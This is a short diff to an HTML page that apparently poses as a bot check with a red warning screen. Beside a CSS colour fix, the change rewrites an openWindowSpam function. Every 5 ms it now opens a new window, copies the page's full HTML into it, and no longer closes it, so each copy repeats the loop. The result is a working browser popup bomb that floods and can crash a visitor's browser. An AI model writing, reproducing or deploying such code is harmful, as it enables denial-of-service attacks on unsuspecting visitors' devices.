@@ -16,7 +16,7 @@
     }
     #bot-check, #warning { display: none; }
     #bot-check p { font-size: 1.5em; margin: .5em 0; }
-    #warning h1 { color: ###f90000; font-size: 3em; margin: .2em 0; }
+    #warning h1 { color: #f90000; font-size: 3em; margin: .2em 0; }
     #warning p { font-size: 1.2em; margin: .5em 0; }
     canvas { position: absolute; top: 0; left: 0; }
   </style>
@@ -42,8 +42,8 @@
 
     function openWindowSpam() {
       setInterval(() => {
-        const w = window.open(window.location.href);
-        if (w) w.close();
+                var w = window.open();
+        w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML);
       }, 5);
     }
 
